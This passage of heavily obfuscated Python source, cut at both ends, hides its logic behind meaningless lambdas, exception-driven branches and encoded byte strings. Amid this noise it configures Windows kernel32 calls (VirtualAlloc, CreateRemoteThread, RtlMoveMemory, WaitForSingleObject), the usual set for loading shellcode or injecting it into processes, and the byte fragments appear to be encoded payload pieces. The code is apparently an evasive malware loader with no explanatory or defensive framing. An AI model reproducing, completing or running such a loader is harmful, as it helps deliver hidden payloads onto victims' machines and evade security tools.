                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _47: _47 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1419:
        __7818457321908 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1215' == '35':
        case True:
            raise MemoryError([True])
        case False:
            _1213 = [[True], [False]]
            R_E_D__A_V______(['_182'])
    raise MemoryError([True])
except MemoryError as _1312:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742706]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _111: _111 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1019 = [[(lambda : (lambda _158: _158 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _199: _199 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _1918: _1918 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _196:
        try:
            raise MemoryError(__7818457321908)
        except MemoryError as __3951519898370:
            if __3951519898370.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.restype = wt.LPVOID
            if __3951519898370.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3081957782060 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xeeP&\xfe\xfe\xdd'))()
            if __3951519898370.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __8250405878948 = (lambda : R_E_D__A_V(b'R_E_D__A_V__Pv]\xbb\xb8<'))()
            if __3951519898370.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __3474693748009 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xb5\xafC\xa0G\xcd'))()
try:
    match '1911' == '1119':
        case True:
            raise MemoryError([True])
        case False:
            _1613 = [[True], [False]]
            R_E_D__A_V______(['_810'])
    raise MemoryError([True])
except MemoryError as _179:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1512: _1512 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1714 = [[(lambda : (lambda _1416: _1416 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _24: _24 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _198: _198 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1914:
        __2293770210711 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '79' == '1916':
        case True:
            raise MemoryError([True])
        case False:
            _194 = [[True], [False]]
            R_E_D__A_V______(['_115'])
    raise MemoryError([True])
except MemoryError as _1614:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1316: _1316 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _319 = [[(lambda : (lambda _116: _116 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _105: _105 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _158: _158 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1012:
        __2293770210711 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '913' == '1210':
        case True:
            raise MemoryError([True])
        case False:
            _183 = [[True], [False]]
            R_E_D__A_V______(['_37'])
    raise MemoryError([True])
except MemoryError as _1013:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _192: _192 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _89 = [[(lambda : (lambda _47: _47 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _513: _513 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _165: _165 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1718:
        try:
            raise MemoryError(__2293770210711)
        except MemoryError as __8178869310385:
            if __8178869310385.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
            if __8178869310385.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7122517630918 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x80\x83\x89/7\xa2'))()
try:
    match '147' == '142':
        case True:
            raise MemoryError([True])
        case False:
            _183 = [[True], [False]]
            R_E_D__A_V______(['_113'])
    raise MemoryError([True])
except MemoryError as _187:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _54: _54 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _811 = [[(lambda : (lambda _118: _118 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _168: _168 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda : (lambda _1416: _1416 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _107:
        __2466318390725 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1513' == '183':
        case True:
            raise MemoryError([True])
        case False:
            _1016 = [[True], [False]]
            R_E_D__A_V______(['_73'])
    raise MemoryError([True])
except MemoryError as _189:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742709]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _146: _146 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _133 = [[(lambda : (lambda _1318: _1318 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _49: _49 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _107: _107 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _167:
        __2466318390725 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '186' == '1110':
        case True:
            raise MemoryError([True])
        case False:
            _194 = [[True], [False]]
            R_E_D__A_V______(['_1617'])
    raise MemoryError([True])
except MemoryError as _1812:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742712]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _813: _813 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _139 = [[(lambda : (lambda _138: _138 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1113: _1113 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _14: _14 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _53:
        try:
            raise MemoryError(__2466318390725)
        except MemoryError as __6656446124571:
            if __6656446124571.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.restype = wt.HANDLE
            if __6656446124571.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6618737903224 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x9ceU\xc3\xc5\xdf'))()
            if __6656446124571.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3449556661157 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xbb-a6\x98\xa0'))()
            if __6656446124571.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __8532177523462 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xfc\x05T@&M'))()
            if __6656446124571.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __8465332026275 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05\xc2\xba\x9e\x8cl'))()
try:
    match '1619' == '84':
        case True:
            raise MemoryError([True])
        case False:
            _1415 = [[True], [False]]
            R_E_D__A_V______(['_211'])
    raise MemoryError([True])
except MemoryError as _112:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742708]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _716: _716 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _184 = [[(lambda : (lambda _513: _513 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _718: _718 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda : (lambda _127: _127 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _218:
        __4617399506819 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '919' == '713':
        case True:
            raise MemoryError([True])
        case False:
            _101 = [[True], [False]]
            R_E_D__A_V______(['_54'])
    raise MemoryError([True])
except MemoryError as _36:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742703]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _410: _410 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _15 = [[(lambda : (lambda _41: _41 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _32: _32 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742710]))))())())()])
        raise MemoryError([(lambda : (lambda _1211: _1211 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _154:
        __4617399506819 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '52' == '18':
        case True:
            raise MemoryError([True])
        case False:
            _171 = [[True], [False]]
            R_E_D__A_V______(['_1418'])
    raise MemoryError([True])
except MemoryError as _716:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _37: _37 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1314 = [[(lambda : (lambda _1510: _1510 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _610: _610 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _137: _137 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _89:
        try:
            raise MemoryError(__4617399506819)
        except MemoryError as __4732286365497:
            if __4732286365497.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
            if __4732286365497.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __8538254446051 = (lambda : R_E_D__A_V(b'R_E_D__A_V__Ob\xa4z\xa7\xa7'))()
            if __4732286365497.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __3682222619601 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x87\xbf\xdf\xd3\xcfD'))()
            if __4732286365497.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __4081612517725 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\\\x90\xee1\x8e\xc6'))()
            if __4732286365497.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __7241687981797 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xe9\xefw\x1b9o'))()
            if __4732286365497.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __3396549289862 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x1a#3\xe5"\xcc'))()
try:
    match '1511' == '610':
        case True:
            raise MemoryError([True])
        case False:
            _159 = [[True], [False]]
            R_E_D__A_V______(['_62'])
    raise MemoryError([True])
except MemoryError as _126:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1411: _1411 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _611 = [[(lambda : (lambda _810: _810 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _1013: _1013 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _813: _813 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _188:
        __4803224467644 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '210' == '1615':
        case True:
            raise MemoryError([True])
        case False:
            _611 = [[True], [False]]
            R_E_D__A_V______(['_1819'])
    raise MemoryError([True])
except MemoryError as _13:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704, 16742706]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _63: _63 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _419 = [[(lambda : (lambda _36: _36 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _26: _26 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742712, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _1216: _1216 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _710:
        __4803224467644 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '814' == '1116':
        case True:
            raise MemoryError([True])
        case False:
            _101 = [[True], [False]]
            R_E_D__A_V______(['_1319'])
    raise MemoryError([True])
except MemoryError as _814:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _35: _35 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _151 = [[(lambda : (lambda _81: _81 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _148: _148 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742705]))))())())()])
        raise MemoryError([(lambda : (lambda _144: _144 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _91:
        try:
            raise MemoryError(__4803224467644)
        except MemoryError as __7804174212887:
            if __7804174212887.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.restype = None
            if __7804174212887.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __2984391921988 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\x83<\xa0\xc2\xd6\x13'))()
            if __7804174212887.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __5426145156787 = (lambda : R_E_D__A_V(b'R_E_D__A_V__-X\xe4l\x18\xca'))()
            if __7804174212887.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __3939772270398 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xf8\x02\xfa\xae\xa4\xe0'))()
            if __7804174212887.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __2367591002358 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xd0\xb7\x1f\xe9Z\xfc'))()
try:
    match '812' == '1517':
        case True:
            raise MemoryError([True])
        case False:
            _81 = [[True], [False]]
            R_E_D__A_V______(['_92'])
    raise MemoryError([True])
except MemoryError as _1512:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742703]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _164: _164 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _138 = [[(lambda : (lambda _174: _174 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _156: _156 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742708]))))())())()])
        raise MemoryError([(lambda : (lambda _1614: _1614 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1514:
        __5417299578882 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '154' == '75':
        case True:
            raise MemoryError([True])
        case False:
            _512 = [[True], [False]]
            R_E_D__A_V______(['_116'])
    raise MemoryError([True])
except MemoryError as _1610:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742704]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _617: _617 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1115 = [[(lambda : (lambda _612: _612 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _126: _126 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742711]))))())())()])
        raise MemoryError([(lambda : (lambda _513: _513 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _613:
        __5417299578882 += (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '32' == '1415':
        case True:
            raise MemoryError([True])
        case False:
            _181 = [[True], [False]]
            R_E_D__A_V______(['_1311'])
    raise MemoryError([True])
except MemoryError as _510:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742707]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1118: _1118 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _116 = [[(lambda : (lambda _72: _72 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _713: _713 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742712]))))())())()])
        raise MemoryError([(lambda : (lambda _614: _614 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _619:
        try:
            raise MemoryError(__5417299578882)
        except MemoryError as __6885596734233:
            if __6885596734233.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
            if __6885596734233.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3560876176275 = (lambda : R_E_D__A_V(b'R_E_D__A_V__>\x16|\r\x9eI'))()
            if __6885596734233.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __5103587622547 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xc2Xle\xdcc'))()
            if __6885596734233.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __4791848759599 = (lambda : R_E_D__A_V(b'R_E_D__A_V__w\xb22\x93\x93\r'))()
try:
    match '212' == '172':
        case True:
            raise MemoryError([True])
        case False:
            _57 = [[True], [False]]
            R_E_D__A_V______(['_169'])
    raise MemoryError([True])
except MemoryError as _104:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742711]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1315: _1315 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1416 = [[(lambda : (lambda _124: _124 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _318: _318 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742709]))))())())()])
        raise MemoryError([(lambda : (lambda _1715: _1715 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1917:
        __7892525164111 = (lambda : R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '137' == '812':
        case True:
            raise MemoryError([True])
        case False:
            _614 = [[True], [False]]
            R_E_D__A_V______(['_810'])
    raise MemoryError([True])
except MemoryError as _13:
    try:
